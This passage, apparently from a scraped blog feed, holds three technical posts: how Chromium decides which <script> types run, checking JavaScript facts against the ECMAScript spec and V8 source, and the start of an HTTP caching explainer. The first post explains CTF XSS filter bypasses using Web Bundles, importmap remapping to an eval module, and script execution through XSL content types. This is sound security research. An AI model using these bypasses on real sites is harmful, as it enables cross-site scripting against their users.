attribute.&lt;/spec> if (MIMETypeRegistry::IsSupportedJavaScriptMIMEType(\"text/\" + language)) return true; // Not spec'ed. if (MIMETypeRegistry::IsLegacySupportedJavaScriptLanguage(language)) return true; &#125; else if (type.IsEmpty()) &#123; // &lt;spec step=\"8\">the script element has a type attribute and its value is // the empty string, or&lt;/spec> return true; &#125; else &#123; // &lt;spec step=\"8\">Otherwise, if the script element has a type attribute, let // the script block's type string for this script element be the value of // that attribute with leading and trailing ASCII whitespace // stripped.&lt;/spec> if (MIMETypeRegistry::IsSupportedJavaScriptMIMEType( type.StripWhiteSpace())) &#123; return true; &#125; // Not spec'ed. if (support_legacy_types == ScriptLoader::kAllowLegacyTypeInTypeAttribute &amp;&amp; MIMETypeRegistry::IsLegacySupportedJavaScriptLanguage(type)) &#123; return true; &#125; &#125; return false; &#125; Then, we can search this keyword:IsSupportedJavaScriptMIMEType and find this file: third_party&#x2F;blink&#x2F;common&#x2F;mime_util&#x2F;mime_util.cc // Support every script type mentioned in the spec, as it notes that \"User // agents must recognize all JavaScript MIME types.\" See // https://html.spec.whatwg.org/#javascript-mime-type. const char* const kSupportedJavascriptTypes[] = &#123; \"application/ecmascript\", \"application/javascript\", \"application/x-ecmascript\", \"application/x-javascript\", \"text/ecmascript\", \"text/javascript\", \"text/javascript1.0\", \"text/javascript1.1\", \"text/javascript1.2\", \"text/javascript1.3\", \"text/javascript1.4\", \"text/javascript1.5\", \"text/jscript\", \"text/livescript\", \"text/x-ecmascript\", \"text/x-javascript\", &#125;; You can also see the URL of the spec from the comments. The list given is the same, and this list is basically the answer to the first question. The above MIME types can be loaded as script. But we can find one thing, that is, every MIME type contains script. At that time, I got stuck at this point. Later, the author released a hint: Origin Trials. Follow the hint I found a feature called Web Bundles. This is the answer to the XSS challenge. What is Web Bundles? To put it simply, Web Bundles is a feature that you can package a bunch of data (HTML, CSS, JS…) together into a .wbn file. The above article mentions an example that your friend wants to share with a web game with you, but he can’t do it because there is no internet connection. But through the Web Bundles, he can package the web game into a .wbn file and send it to you. After you receive it via bluetooth or airdrop, you can just open it in the browser, just like an app. In addition to loading the entire app, you can also load specific resources from the Web Bundle. You can find the detail here:Explainer: Subresource loading with Web Bundles. Here is the example from the article: &lt;script type=\"webbundle\"> &#123; \"source\": \"https://example.com/dir/subresources.wbn\", \"resources\": [\"https://example.com/dir/a.js\", \"https://example.com/dir/b.js\", \"https://example.com/dir/c.png\"] &#125; &lt;/script> When you load https://example.com/dir/a.js , the browser will first go to subresources.wbn to find this resource, instead of reaching to the server to download it directly. So, for the XSS challenge I mentioned in the beginning, the answer is to bundle the JavaScript into a web bundle file, and then load it. It’s MIME type is application/webbundle, so it’s allow. After web bundle is loaded, we can load script from it. But why didn’t we see this feature when we looked at the Chromium code? This is because we are too focus on MIME type, so we only look atIsValidClassicScriptTypeAndLanguage, but we should see another function who call it: GetScriptTypeAtPrepare： ScriptLoader::ScriptTypeAtPrepare ScriptLoader::GetScriptTypeAtPrepare( const String&amp; type, const String&amp; language, LegacyTypeSupport support_legacy_types) &#123; if (IsValidClassicScriptTypeAndLanguage(type, language, support_legacy_types)) &#123; &#x2F;&#x2F; &lt;spec step&#x3D;&quot;8&quot;&gt;... If the script block&#39;s type string is a JavaScript MIME &#x2F;&#x2F; type essence match, the script&#39;s type is &quot;classic&quot;. ...&lt;&#x2F;spec&gt; return ScriptTypeAtPrepare::kClassic; &#125; if (EqualIgnoringASCIICase(type, script_type_names::kModule)) &#123; &#x2F;&#x2F; &lt;spec step&#x3D;&quot;8&quot;&gt;... If the script block&#39;s type string is an ASCII &#x2F;&#x2F; case-insensitive match for the string &quot;module&quot;, the script&#39;s type is &#x2F;&#x2F; &quot;module&quot;. ...&lt;&#x2F;spec&gt; return ScriptTypeAtPrepare::kModule; &#125; if (EqualIgnoringASCIICase(type, script_type_names::kImportmap)) &#123; return ScriptTypeAtPrepare::kImportMap; &#125; if (EqualIgnoringASCIICase(type, script_type_names::kSpeculationrules)) &#123; return ScriptTypeAtPrepare::kSpeculationRules; &#125; if (EqualIgnoringASCIICase(type, script_type_names::kWebbundle)) &#123; return ScriptTypeAtPrepare::kWebBundle; &#125; &#x2F;&#x2F; &lt;spec step&#x3D;&quot;8&quot;&gt;... If neither of the above conditions are true, then &#x2F;&#x2F; return. No script is executed.&lt;&#x2F;spec&gt; return ScriptTypeAtPrepare::kInvalid; &#125; Calling IsValidClassicScriptTypeAndLanguage is just the first step, there are other type as well, and it’s the answer to question two. Question 2: Acceptable types of &lt;script&gt;Like previous question, it’s also about a CTF challenge. There is a challenge called YACA in PlaidCTF 2022, here is the offical writeup: https://github.com/zwade/yaca/tree/master/solution We know from the code I just posted that the answer to this question is the answer to the first question (that pile of MIME types) plus the following four types: module importmap speculationrules webbundle We already know module and webbundle, so let’s take a look at importmap and specificationrules. The specification of import map is here: https://github.com/WICG/import-maps What is the problem import map wants to solve? Although the browser already supports module and import, you still can’t do this on the browser: import moment from \"moment\"; import &#123; partition &#125; from \"lodash\"; You can only write like this: import moment from \"/node_modules/moment/src/moment.js\"; import &#123; partition &#125; from \"/node_modules/lodash-es/lodash.js\"; import map want to solve this problem by introducing a mapping table: &lt;script type=\"importmap\"> &#123; \"imports\": &#123; \"moment\": \"/node_modules/moment/src/moment.js\", \"lodash\": \"/node_modules/lodash-es/lodash.js\" &#125; &#125; &lt;/script> The challenge we mentioned can be solve by changing the file like this: &lt;script type=\"importmap\"> &#123; \"imports\": &#123; \"/js/ast-to-js.mjs\": \"/js/eval-code.mjs\" &#125; &#125; &lt;/script> Let’s take a look at speculationrules, here is the spec: https://github.com/WICG/nav-speculation This feature is mainly to solve some problems caused by pre-rendering, I haven’t delved into it. It works like this: &lt;script type=\"speculationrules\"> &#123; \"prerender\": [ &#123;\"source\": \"list\", \"urls\": [\"/page/2\"], \"score\": 0.5&#125;, &#123;\"source\": \"document\", \"if_href_matches\": [\"https://*.wikipedia.org/**\"], \"if_not_selector_matches\": [\".restricted-section *\"], \"score\": 0.1&#125; ] &#125; &lt;/script> It uses a JSON file for the pre-render rule, quite different from &lt;link rel=&quot;prerender&quot;&gt;. Question 3: content typeIt’s from a challenge called PlanetSheet in Securinets CTF Quals 2022. When the content type is text/xsl , we can run script via &lt;x:script&gt;. This classic research is mentioned in each writeup: Content-Type Research , you can find the detail in it. The following five content types can execute XSS in all browsers: text&#x2F;html application&#x2F;xhtml+xml application&#x2F;xml text&#x2F;xml image&#x2F;svg+xml I was curious about this behavior, so I checked the source code of Chromium a bit, and found other two content types that are always put together with the others: application&#x2F;rss+xml application&#x2F;atom+xml Code: xsl_style_sheet_resource.cc static void ApplyXSLRequestProperties(FetchParameters&amp; params) &#123; params.SetRequestContext(mojom::blink::RequestContextType::XSLT); params.SetRequestDestination(network::mojom::RequestDestination::kXslt); &#x2F;&#x2F; TODO(japhet): Accept: headers can be set manually on XHRs from script, in &#x2F;&#x2F; the browser process, and... here. The browser process can&#39;t tell the &#x2F;&#x2F; difference between an XSL stylesheet and a CSS stylesheet, so it assumes &#x2F;&#x2F; stylesheets are all CSS unless they already have an Accept: header set. &#x2F;&#x2F; Should we teach the browser process the difference? DEFINE_STATIC_LOCAL(const AtomicString, accept_xslt, (&quot;text&#x2F;xml, application&#x2F;xml, application&#x2F;xhtml+xml, &quot; &quot;text&#x2F;xsl, application&#x2F;rss+xml, application&#x2F;atom+xml&quot;)); params.MutableResourceRequest().SetHTTPAccept(accept_xslt); &#125; However, these two will not be loaded as XML, so I searched and found this bug: Issue 104358: Consider allowing more types to parse as XML, which mentioned a commit in 2009: if (mime_type &#x3D;&#x3D; &quot;application&#x2F;rss+xml&quot; || mime_type &#x3D;&#x3D; &quot;application&#x2F;atom+xml&quot;) &#123; &#x2F;&#x2F; Sad face. The server told us that they wanted us to treat the response &#x2F;&#x2F; as RSS or Atom. Unfortunately, we don&#39;t have a built-in feed previewer &#x2F;&#x2F; like other browsers. We can&#39;t just render the content as XML because &#x2F;&#x2F; web sites let third parties inject arbitrary script into their RSS &#x2F;&#x2F; feeds. That leaves us with little choice but to practically ignore the &#x2F;&#x2F; response. In the future, when we have an RSS feed previewer, we can &#x2F;&#x2F; remove this logic. mime_type.assign(&quot;text&#x2F;plain&quot;); response_-&gt;response_head.mime_type.assign(mime_type); &#125; Because the RSS feed may contain third-party cotnent, it’s vulnerable to XSS if it is rendered as XML, so these two are forcibly turned off. By the way, there is a awesome tool for searching source code: https://sourcegraph.com/search","link":"/2022/04/24/en/how-much-do-you-know-about-script-type/"},{"title":"Your JavaScript Knowledge Might Be Wrong","text":"After discussing the history and baggage of JavaScript, let’s talk about JavaScript itself. Have you ever wondered how to know if an author of a JavaScript book or tutorial article has written it correctly? How do you know if the knowledge in the book is correct? As the title suggests, could it be that the JavaScript knowledge you previously knew was actually wrong? Do you just trust the author because they often write technical articles? Or do you believe it because it’s written the same way on MDN? Or is it because everyone says it, so it must be right? Some questions do not have standard answers, such as the trolley problem, where different schools of thought will have their own approved answers, and there is no saying which one is necessarily correct. Fortunately, the world of programming languages is relatively simple. When we talk about JavaScript knowledge, there are two places where you can verify whether this knowledge is correct. The first is called the ECMAScript specification, and the second one, we’ll talk about later. ECMAScriptIn 1995, JavaScript was officially launched as a programming language that could run on Netscape. If you want to ensure cross-browser support, you need a standardized specification that all browsers can follow. In 1996, Netscape contacted Ecma International (European Computer Manufacturers Association) and established a new technical committee (Technical Committee). Since it was numbered sequentially using numbers, it happened to be numbered 39 at that time, which is the TC39 we are familiar with now. In 1997, ECMA-262 was officially released, which is the first version of what we commonly call ECMAScript. Why is it called ECMAScript instead of JavaScript? Because JavaScript had already been registered as a trademark by Sun at that time and was not available for use by the Ecma Association, so it couldn’t be called JavaScript. Therefore, this standard was later called ECMAScript. As for JavaScript, you can think of it as a programming language that implements the ECMAScript specification. When you want to know the specification of a certain JavaScript feature, it’s not wrong to look at ECMAScript, and the detailed behavior will be recorded in it. Standards will continue to evolve, and new standards will appear almost every year, incorporating new proposals. For example, as of the time of writing, the latest is ECMAScript 12, which was released in 2021. It is usually referred to as ES12 or ES2021. The commonly heard ES6 is also called ES2015, representing the sixth version of ECMAScript released in 2015. If you are interested in the history of ECMAScript and these terms, you can refer to the following articles: Twenty Years of JavaScript: Standardization Day2 [JavaScript Basics] A Brief Discussion of ECMAScript and JavaScript JavaScript Journey (1): Introduction to ECMA, ECMAScript, JavaScript, and TC39 Next, let’s take a brief look at what the ECMAScript specification looks like. Exploring ECMAScriptYou can find all versions of ECMAScript on this page: https://www.ecma-international.org/publications-and-standards/standards/ecma-262/ You can download the PDF directly or view the HTML version online. I would recommend downloading the PDF because the HTML seems to load all the content together, so it takes a long time to load, and there is a risk of crashing when paging. When we open the ES2021 specification, we will find that it is a huge document with 879 pages. The specification is like a dictionary, it’s for you to look up, not for you to read like a storybook. But as long as you can use the search function well, you can still quickly find the paragraph you want. Below, let’s take a look at the specifications of three different types of features. String.prototype.repeatSearch for “String.prototype.repeat”, and you can find the directory. Clicking on the directory will take you directly to the corresponding paragraph: 22.1.3.16 String.prototype.repeat, which is as follows: You can try to read it yourself first. Specifications are actually similar to programs, like pseudo code, so there are many programming concepts in them. For example, you will see many function calls above, and you need to check the definitions of other functions to understand exactly what they do. However, many functions can be inferred from their names, which shows that function naming is really important. The above specification basically tells us two things that we may not have known before: If the count is negative or infinite when calling repeat, an error will occur. Repeat seems to not only work with strings. The second point is actually quite important in JavaScript. In ECMAScript, you will also often see similar cases, which say “The xxx function is intentionally generic”. What does this mean? Did you notice the first two steps, which are: Let O be ? RequireObjectCoercible(this value). Let S be ? ToString(O). Aren’t we already dealing with strings? Why do we need to ToString again? And why is it related to this? When we call &quot;abc&quot;.repeat(3), we are actually calling the String.prototype.repeat function, and this is &quot;abc&quot;, so it can be considered as String.prototype.repeat.call(&quot;abc&quot;, 3). Since it can be converted into this call format, it means that you can also pass something that is not a string into it, for example: String.prototype.repeat.call(123, 3), and it will not break, it will return &quot;123123123&quot;, and all of this is thanks to the extensibility of the specification definition. Just now we saw in the specification that it was specially written that this function is intentionally written as generic, so it is not just strings that can be called, as long as it “can be converted into a string”, it can actually use this function. This is also why the first two steps in the specification are to convert this to a string, so that non-strings can also be used. Here’s another even more interesting example: function a()&#123;console.log('hello')&#125; const result = String.prototype.repeat.call(a, 2) console.log(result) // function a()&#123;console.log('hello')&#125;function a()&#123;console.log('hello')&#125; Because functions can be converted into strings, they can of course be passed into repeat, and the toString method of the function will return the entire code of the function, so we get the output we saw at the end. Regarding prototype and these things above, we will talk about prototype again later. In short, from the specification, we can see a feature of ECMAScript, which is deliberately making these built-in methods more extensive and applicable to various types, as long as they can be converted into strings. typeofSimilarly, searching for typeof in the PDF will find 13.5.3 The typeof Operator, with the following content: We can see that typeof will perform some internal operations on the passed-in value, such as IsUnresolvableReference or GetValue, but usually we only care about the table below, which is what each type will return. In the table, we can see two interesting things. The first thing is the famous bug, typeof null will return object, and this bug has become part of the specification today. The second thing is that for the specification, objects and functions are actually both Object internally, the only difference is whether they have implemented the [[Call]] method. In fact, if you look at other sections, you can also see that the term “function object” is used multiple times in the specification, which shows that in the specification, a function is just an object that can be called. CommentsNext, let’s take a look at the syntax of comments. Searching for comments will find 12.4 Comments, and below is a partial screenshot: We can see how ECMAScript represents syntax from top to bottom. Comments are divided into two types, MultiLineComment and SingleLineComment, and there are definitions for each below. MultiLineComment is /* MultiLineCommentChars */, and the yellow small font “opt” means optional, which means that MultiLineCommentChars can be omitted, such as /**/, and the definition continues below. For single-line comments, it looks like this: In fact, the meaning is similar to that of multi-line comments, and the last line guides us to B.1.3. Let’s take a look at the content there: Here, HTML-like comments are additionally defined, and it looks like all of them are valid except for some special cases. We can see that the definition of comments here has been further increased by three types: SingleLineHTMLOpenComment SingleLineHTMLCloseComment SingleLineDelimitedComment From the specification, we can get new cold knowledge, which is that single-line comments not only have //, but also HTML comments can be used: &lt;!-- 我是註解 console.log(1) // 我也是 console.log(2) --> 我也是 console.log(3) This is a JavaScript cold knowledge that can only be seen from the specification. When someone tells you that JavaScript comments only have // and /* */, if you have read the ECMAScript specification, you will know that what they are saying is wrong, and there is more than that. The above are the three small paragraphs we found from ECMAScript, mainly to let everyone take a look at what the specification looks like. If you are interested in reading the specification, I would recommend that you first read the ES3 specification, because ES3 is much more complete than the previous two versions, and the number of pages is small, only 188 pages, which can be read like a general book, one page at a time. Although the wording and underlying mechanisms of the specification have changed somewhat since ES6, I think it is still good to start with ES3 to get familiar with the specification with minimal effort. If you are interested in reading the specification and want to study it carefully, you can refer to the following two articles: Translation: How to read the ECMAScript Specification in Chinese V8 blog - Understanding ECMAScript We mentioned earlier that there are two places where you can verify whether your JavaScript knowledge is correct. The first is the ECMAScript specification, and the second is something you should think about first. Now it’s time to reveal the answer, and that is: “JavaScript engine source code.” Talking about JavaScript engine source codeThe ECMAScript specification defines how a programming language “should” be, but in fact, how it is actually implemented belongs to the “implementation” part. It’s like a PM defining a product specification, but an engineer may miss something and cause implementation errors, or may not be able to fully comply with the specification for various reasons, resulting in some differences. So if you find a strange phenomenon in Chrome and find that the behavior is different from the ECMAScript specification, it is very likely that the implementation of the JavaScript engine in Chrome is actually different from the specification, which leads to this difference. The specification is just a specification, and in the end, we still have to look at the implementation of the engine. In the case of Chrome, it uses a JavaScript engine called V8 behind the scenes. If you know nothing about JS engines, you can first watch this video: Franziska Hinkelmann: JavaScript engines - how do they even? | JSConf EU. And if you want to see the V8 code, you can see the official version: https://chromium.googlesource.com/v8/v8.git, or you can see this version on GitHub: https://github.com/v8/v8 When reading the ECMAScript specification, we looked at three different functions. Let’s take a look at how these functions are implemented in V8. String.prototype.repeatIn V8, there is a programming language called Torque, which was born to make it easier to implement the logic in ECMAScript. The syntax is similar to TypeScript. For details, please refer to: V8 Torque user manual The relevant code for String.prototype.repeat is here: src&#x2F;builtins&#x2F;string-repeat.tq // https://tc39.github.io/ecma262/#sec-string.prototype.repeat transitioning javascript builtin StringPrototypeRepeat( js-implicit context: NativeContext, receiver: JSAny)(count: JSAny): String &#123; // 1. Let O be ? RequireObjectCoercible(this value). // 2. Let S be ? ToString(O). const s: String = ToThisString(receiver, kBuiltinName); try &#123; // 3. Let n be ? ToInteger(count). typeswitch (ToInteger_Inline(count)) &#123; case (n: Smi): &#123; // 4. If n &lt; 0, throw a RangeError exception. if (n &lt; 0) goto InvalidCount; // 6. If n is 0, return the empty String. if (n == 0 || s.length_uint32 == 0) goto EmptyString; if (n > kStringMaxLength) goto InvalidStringLength; // 7. Return the String value that is made from n copies of S appended // together. return StringRepeat(s, n); &#125; case (heapNum: HeapNumber): deferred &#123; dcheck(IsNumberNormalized(heapNum)); const n = LoadHeapNumberValue(heapNum); // 4. If n &lt; 0, throw a RangeError exception. // 5. If n is +∞, throw a RangeError exception. if (n == V8_INFINITY || n &lt; 0.0) goto InvalidCount; // 6. If n is 0, return the empty String. if (s.length_uint32 == 0) goto EmptyString; goto InvalidStringLength; &#125; &#125; &#125; label EmptyString &#123; return kEmptyString; &#125; label InvalidCount deferred &#123; ThrowRangeError(MessageTemplate::kInvalidCountValue, count); &#125; label InvalidStringLength deferred &#123; ThrowInvalidStringLength(context); &#125; &#125; As you can see, the comment is actually the content of the specification, and the code directly translates the specification. The actual implementation of the repeat function is as follows: builtin StringRepeat(implicit context: Context)( string: String, count: Smi): String &#123; dcheck(count >= 0); dcheck(string != kEmptyString); let result: String = kEmptyString; let powerOfTwoRepeats: String = string; let n: intptr = Convert&lt;intptr>(count); while (true) &#123; if ((n &amp; 1) == 1) result = result + powerOfTwoRepeats; n = n >> 1; if (n == 0) break; powerOfTwoRepeats = powerOfTwoRepeats + powerOfTwoRepeats; &#125; return result; &#125; From here, we can see an interesting detail, which is that when repeating, it is not simply running a loop from 1 to n and then copying n times. This is too slow. Instead, it uses the square and multiply algorithm. For example, if we want to generate &#39;a&#39;.repeat(8), the usual method requires 7 additions, but we can first add once to generate aa, then add each other to generate aaaa, and finally add each other once more to get 8 repetitions using three additions (2^3 = 8), saving a lot of string concatenation operations. From this, we can see that low-level implementations like JavaScript engines must also consider performance. typeofThe definition of typeof in V8 is here, and the comment also mentions the relevant spec section: src&#x2F;objects&#x2F;objects.h#466 // ES6 section 12.5.6 The typeof Operator static Handle&lt;String> TypeOf(Isolate* isolate, Handle&lt;Object> object); The implementation is here: src&#x2F;objects&#x2F;objects.cc#870 // static Handle&lt;String> Object::TypeOf(Isolate* isolate, Handle&lt;Object> object) &#123; if (object->IsNumber()) return isolate->factory()->number_string(); if (object->IsOddball()) return handle(Oddball::cast(*object).type_of(), isolate); if (object->IsUndetectable()) &#123; return isolate->factory()->undefined_string(); &#125; if (object->IsString()) return isolate->factory()->string_string(); if (object->IsSymbol()) return isolate->factory()->symbol_string(); if (object->IsBigInt()) return isolate->factory()->bigint_string(); if (object->IsCallable()) return isolate->factory()->function_string(); return isolate->factory()->object_string(); &#125; As you can see, it checks for various types. Some people may be curious about what Oddball is. null, undefined, true, and false are all stored using this type. I’m not sure of the exact reason, but if you want to delve deeper, you can refer to: Learning Google V8 Playing with Node&#x2F;V8 postmortem debugging V8源码边缘试探-黑魔法指针偏移 But if Oddball already includes undefined, why is there still a check below that also returns undefined? What is this undetectable? if (object->IsUndetectable()) &#123; return isolate->factory()->undefined_string(); &#125; All of this is due to historical baggage. In the era when IE was prevalent, there was an IE-specific API called document.all, which could be used to get the specified element with document.all(&#39;a&#39;). At that time, there was also a popular way to detect whether the browser was IE: var isIE = !!document.all if (isIE) &#123; // 呼叫 IE 才有的 API &#125; Later, Opera also followed suit and implemented document.all, but ran into a problem. Since it had implemented the IE-specific functionality, if a website used the above method to detect IE, it would be judged as IE. However, Opera did not have those IE-specific APIs, so the webpage would crash with an execution error. Firefox learned from Opera’s story when implementing this feature. Although it implemented the functionality of document.all, it did some tricks to prevent it from being detected: typeof document.all // undefined !!document.all // false That is, typeof document.all must be forced to return undefined, and when converted to a boolean, it must also return false. It’s really a master workaround. Later, other browsers followed this implementation, and this implementation even became part of the standard, appearing in B.3.7 The [[IsHTMLDDA]] Internal Slot. The IsUndetectable we see in V8 is generated to implement this mechanism. You can see it very clearly in the comments, and the code is in src&#x2F;objects&#x2F;map.h#391: // Tells whether the instance is undetectable. // An undetectable object is a special class of JSObject: 'typeof' operator // returns undefined, ToBoolean returns false. Otherwise it behaves like // a normal JS object. It is useful for implementing undetectable // document.all in Firefox &amp; Safari. // See https://bugzilla.mozilla.org/show_bug.cgi?id=248549. DECL_BOOLEAN_ACCESSORS(is_undetectable) At this point, you might want to open Chrome devtool and play with document.all to experience this historical baggage. Chrome also had a bug because of this historical baggage. You can refer to What is the bug of V8’s typeof null returning “undefined” for the relevant story. The above paragraph is also written based on this article. CommentsAs mentioned earlier, JavaScript actually has several little-known comment formats, such as &lt;!-- and --&gt;. Regarding the syntax in V8, you can refer to this file: &#x2F;src&#x2F;parsing&#x2F;scanner-inl.h. We extract a few paragraphs: case Token::LT: // &lt; &lt;= &lt;&lt; &lt;&lt;= &lt;!-- Advance(); if (c0_ == '=') return Select(Token::LTE); if (c0_ == '&lt;') return Select('=', Token::ASSIGN_SHL, Token::SHL); if (c0_ == '!') &#123; token = ScanHtmlComment(); continue; &#125; return Token::LT; case Token::SUB: // - -- --> -= Advance(); if (c0_ == '-') &#123; Advance(); if (c0_ == '>' &amp;&amp; next().after_line_terminator) &#123; // For compatibility with SpiderMonkey, we skip lines that // start with an HTML comment end '-->'. token = SkipSingleHTMLComment(); continue; &#125; return Token::DEC; &#125; if (c0_ == '=') return Select(Token::ASSIGN_SUB); return Token::SUB; case Token::DIV: // / // /* /= Advance(); if (c0_ == '/') &#123; base::uc32 c = Peek(); if (c == '#' || c == '@') &#123; Advance(); Advance(); token = SkipSourceURLComment(); continue; &#125; token = SkipSingleLineComment(); continue; &#125; if (c0_ == '*') &#123; token = SkipMultiLineComment(); continue; &#125; if (c0_ == '=') return Select(Token::ASSIGN_DIV); return Token::DIV; If you encounter &lt;!, call ScanHtmlComment. If you encounter --&gt; and it is at the beginning, call SkipSingleHTMLComment. This paragraph also tells us one thing, that --&gt; must be at the beginning, otherwise it will cause an error (here the beginning refers to no other meaningful statement before it, but spaces and comments are allowed). If you encounter //, check if it is followed by # or @. If so, call SkipSourceURLComment. This is actually the syntax of source map. For details, please refer to sourceMappingURL and sourceURL syntax changed and How source map works. Otherwise, call SkipSingleLineComment. If it is /*, call SkipMultiLineComment. The corresponding functions called above are all in src&#x2F;parsing&#x2F;scanner.cc. Let’s take a more interesting one, ScanHtmlComment, which will be called when encountering &lt;!: Token::Value Scanner::ScanHtmlComment() &#123; // Check for &lt;!-- comments. DCHECK_EQ(c0_, '!'); Advance(); if (c0_ != '-' || Peek() != '-') &#123; PushBack('!'); // undo Advance() return Token::LT; &#125; Advance(); found_html_comment_ = true; return SkipSingleHTMLComment(); &#125; Here, it will continue to look down and see if it is --. If not, it will undo the operation and return Token::LT, which is &lt;. Otherwise, call SkipSingleHTMLComment. The code for SkipSingleHTMLComment is also very simple: Token::Value Scanner::SkipSingleHTMLComment() &#123; if (flags_.is_module()) &#123; ReportScannerError(source_pos(), MessageTemplate::kHtmlCommentInModule); return Token::ILLEGAL; &#125; return SkipSingleLineComment(); &#125; According to the specification, check if flags_.is_module() is true. If so, throw an error. If you want to reproduce this situation, you can create a test.mjs file, use &lt;!-- as a comment, and run it with Node.js to get an error: &lt;!-- 我是註解 ^ SyntaxError: HTML comments are not allowed in modules And &lt;!-- can also cause a fun phenomenon. Most of the time, whether there are spaces between operators does not affect the result, for example, a+b&gt;3 and a + b &gt; 3 have the same result. But because &lt;!-- is a complete syntax, so: var a = 1 var b = 0 &lt; !--a console.log(a) // 0 console.log(b) // true The execution process is to first --a, make a 0, then ! to make it 1, and then 0 &lt; 1 is true, so b is true. But if you change &lt; !-- to &lt;!--: var a = 1 var b = 0 &lt;!--a console.log(a) // 1 console.log(b) // 0 Then there is no operation, because everything after &lt;!-- is a comment. So it’s just var a = 1 and var b = 0. By the way, when searching for implementation code, it is not easy to find what you are looking for in the vast sea of code. I’ll share a method I use, which is to use Google. You can directly search for keywords or use filters to search for code, like this: typeof inurl:https://chromium.googlesource.com/v8/v8.git. If the code is on GitHub, you can also use this very useful website called grep.app to search for content in a specified GitHub repo. ConclusionWhen you obtain knowledge about JavaScript from anywhere (including this article), it may not necessarily be correct. If you want to confirm, there are two levels to verify whether this knowledge is correct. The first level is “whether it conforms to the ECMAScript specification”, which can be achieved by finding the corresponding paragraph in ECMAScript. If I refer to ECMAScript in my article, I will try to attach the reference paragraph to facilitate everyone to verify it themselves. The second level is “whether it conforms to the implementation of the JavaScript engine”, because sometimes the implementation may not be consistent with the specification, and there may be time issues, such as being included in the specification but not yet implemented, or even the other way around. In fact, there is not only one JavaScript engine, and Firefox uses another engine called SpiderMonkey which is different from V8. If you want to try reading the specification after reading this article, but don’t know where to start, I’ll give you a question to find the answer from the specification: “Assuming s is any string, are s.toUpperCase().toLowerCase() and s.toLowerCase() always equal? If not, please give a counterexample.”","link":"/2022/01/30/en/how-to-validate-javascript-knowledge/"},{"title":"Understanding HTTP Cache Mechanism Gradually","text":"PrefaceRecently, I was researching some things related to HTTP Cache, and I found myself confused by the different headers such as Pragma, Cache-Control, Etag, Last-Modified, Expires, etc. After reading many reference materials, I gained a deeper understanding. I thought that if I could understand Cache from a different perspective, it might be easier to understand what these headers are doing. In the previous research materials, many articles explained the functions and parameters of each header one by one. However, I think that too many parameters can easily confuse beginners. Therefore, this article attempts to guide the usage scenarios and purposes of each header step by step through different questions. Also, because this article is for beginners, not all parameters will be discussed. In fact, there are different opinions on Cache on the Internet. If there are any doubts, I will try to follow the standards written in the RFC. If there are any errors, please correct me. Thank you. Why do we need Cache?Asking “why” is a good habit. Before using something, you must know why you need it. So, we need to ask ourselves a question: Why do we need Cache? It’s simple, because it saves traffic, time, or more macroscopically, reduces resource consumption. For example, the homepage of an e-commerce website may have many products. If you retrieve all the data from the database every time a visitor visits the homepage, it will be a huge burden on the database. However, in fact, these information on the homepage will not change in the short term. The price of a product cannot be one thousand yuan one second and two thousand yuan the next second. Therefore, these infrequently changing data are suitable for storage, which is what we call Cache. In Taiwan, it is called “快取” and in China, it is called “緩存”. In the above example, the information on the homepage can be retrieved once and stored somewhere, such as Redis, which is actually stored in the form of a simple Key-Value Pair. Then, whenever this information is used, it can be retrieved at an extremely fast speed, instead of recalculating it in the database. The above is Server-side Cache, which is achieved by retrieving data from the database and storing it elsewhere. However, Server-side Cache is not the focus of today. Interested readers can refer to my previous article: Redis Introduction. Today’s focus is on the Cache mechanism between the Server and the browser. For example, the product images on an e-commerce website. If there is no Cache, the hundreds of product images displayed on the homepage will be downloaded several times as the webpage is viewed several times, which is a huge amount of traffic. Therefore, we must allow the browser to Cache these images. This way, only the first time the webpage is viewed will it need to be downloaded again. The second time it is viewed, the images can be retrieved directly from the browser’s Cache, without requesting data from the Server. ExpiresTo achieve the above function, you can add an Expires field in the HTTP Response Header, which is the expiration time of this Cache, for example: Expires: Wed, 21 Oct 2017 07:28:00 GMT After the browser receives this Response, it will Cache this resource. When the user visits this page again or requests the resource of this image, the browser will check whether the “current time” has exceeded this Expires. If it has not exceeded, the browser “will not send any Request”, but will directly retrieve the data from the Cache stored on the computer. If you open the Chrome dev tool, you will see that it says: “Status code 200 (from disk cache)”, which means that this Request did not actually go out, and the Response was directly retrieved from the disk cache. However, this will actually encounter a problem, because the browser checks the expiration time of this Expires using the “computer’s own time”. What if I like to live in the future and change the time of my computer to 2100? The browser will think that all Cache has expired and will send the Request again. Cache-Control and max-ageExpires is actually a Header that existed in HTTP 1.0. In order to solve the problem encountered by Expires above, a new header appeared in HTTP 1.1, called Cache-Control. (Note: Cache-Control is a Header that appeared in HTTP 1.1, but it not only solves this problem, but also solves many Cache-related problems that HTTP 1.0 cannot handle.) One usage is: Cache-Control: max-age=30, which means that the expiration time of this response is 30 seconds. If the user refreshes the page after 10 seconds of receiving this response, the phenomenon of being cached by the browser will appear as shown above. But if the user refreshes the page after 60 seconds, the browser will send a new request. If you carefully observe the response header of the Google Logo file, you will find that its max-age is set to 31536000 seconds, which means 365 days. As long as you visit this website within a year, no request will be sent for the Google logo image, and the browser will directly use the cached response, which is Status code 200 (from memory cache) written here. Now we encounter a problem. Since both Expires and max-age can determine whether a response has expired, which one should the browser look at if both appear? According to the definition of RFC2616: If a response includes both an Expires header and a max-age directive, the max-age directive overrides the Expires header, even if the Expires header is more restrictive. max-age overrides Expires. Therefore, although both are placed in the cache, only max-age is actually used. Expired, then what?Both of these headers are concerned with the “freshness” of a response. If the response is fresh enough (that is, it has not exceeded Expire or is within the period specified by max-age), the data is directly retrieved from the cache. If it has expired or is not fresh, a request is sent to the server to obtain new data. But here is a special point to note: “Expired does not mean unusable.” What does this mean? It was mentioned earlier that Google’s Logo cache time is one year, and the browser will send a new request after one year, right? But it is very likely that Google’s Logo will not change even after a year, which means that the image cached by the browser can still be used. If this is the case, the server does not need to return a new image, just tell the browser: “You can continue to use the cached image for another year.” Last-Modified and If-Modified-SinceTo achieve the above function, both the server and the client must cooperate with each other. One way is to use the combination of Last-Modified and If-Modified-Since, which HTTP 1.0 already has. When the server sends a response, it can add a Last-Modified header to indicate when the file was last modified. When the cache expires, the browser can use this information to use If-Modified-Since to specify the data that has been changed since a certain point in time when making a request to the server. Let’s take an example. Suppose I request the Google homepage image and receive the following response (for readability, the date format has been changed, and the actual content will not be like this): Last-Modified: 2017-01-01 13:00:00 Cache-Control: max-age&#x3D;31536000 After receiving this response, the browser will cache this image and mark the last update time of this file as 2017-01-01 13:00:00, and the expiration time is one year. If I request this image again after half a year, the browser will tell me: “You don’t need to request it again. The expiration time of this file is one year, and only half a year has 